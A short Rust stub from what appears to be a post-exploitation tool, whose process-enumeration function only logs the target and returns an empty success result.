async fn enumerate_running_processes(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Enumerating running processes on {}", config.target);

    Ok(PostExploitResult {
        module: PostExploitModule::RunningProcesses,
        target: config.target.clone(),
        success: true,
        findings: vec![],
        error: None,
        timestamp: Utc::now(),
    })
}
